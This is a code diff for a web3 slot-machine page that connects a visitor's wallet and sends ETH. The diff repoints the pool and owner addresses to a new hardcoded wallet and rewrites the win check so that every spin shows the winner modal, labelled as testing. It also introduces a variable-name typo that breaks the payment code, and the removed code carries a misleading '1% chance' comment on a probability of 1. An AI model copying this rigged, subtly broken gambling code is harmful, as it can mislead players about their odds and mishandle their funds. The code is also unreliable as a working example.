@@ -8,9 +8,9 @@
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-              background: url('bank.webp') no-repeat center center fixed;
+            background: url('/mnt/data/image.png') no-repeat center center fixed;
             background-size: cover;
-            color: white;
+            color: white; /* Ensure text is readable on the background */
         }
         .slot-machine {
             margin: 20px auto;
@@ -18,7 +18,7 @@
             height: 300px;
             border: 5px solid #ccc;
             border-radius: 20px;
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.8);
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
             display: flex;
             justify-content: center;
@@ -119,8 +119,8 @@
         let web3;
         let userAccount;
         const GNETAddress = '0x67A4B50798c190C77d872D9f02C8a860ad1488e7'; // Replace with your GNET token contract address
-        const poolAddress = '0x3847f6194b6E84BF81A3B6DA8Be0b75933cEbef3'; // Replace with the pool address
-        const ownerAddress = '0x3847f6194b6E84BF81A3B6DA8Be0b75933cEbef3'; // Replace with your owner address
+        const poolAddress = '0xa8aC3E0C9bBDc94db7738b0EceEe63c8f06Ef132'; // Replace with the pool address
+        const ownerAddress = '0xa8aC3E0C9bBDc94db7738b0EceEe63c8f06Ef132'; // Replace with your owner address
 
         async function connectWallet() {
             if (window.ethereum) {
@@ -156,7 +156,7 @@
                 const transactionParameters = {
                     to: recipientAddress,
                     from: userAccount,
-                    value: web3.utils.toHex(web3.utils.toWei(amountInEther, 'ether')),
+                    value: web3.utils.toHex(web3.utils.toWei(amountInether, 'ether')),
                     gas: web3.utils.toHex(21000),
                     gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')),
                 };
@@ -209,11 +209,8 @@
         }
 
         function checkWinner(slot1, slot2, slot3) {
-            const winProbability = 1; // 1% chance to win
-            const randomChance = Math.random();
-            if (slot1 === slot2 && slot2 === slot3 && randomChance < winProbability) {
-                document.getElementById("winner-modal").style.display = "flex";
-            }
+            // For testing purposes, always make the user win
+            document.getElementById("winner-modal").style.display = "flex";
         }
 
         async function submitAddress() {
@@ -246,12 +243,3 @@
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
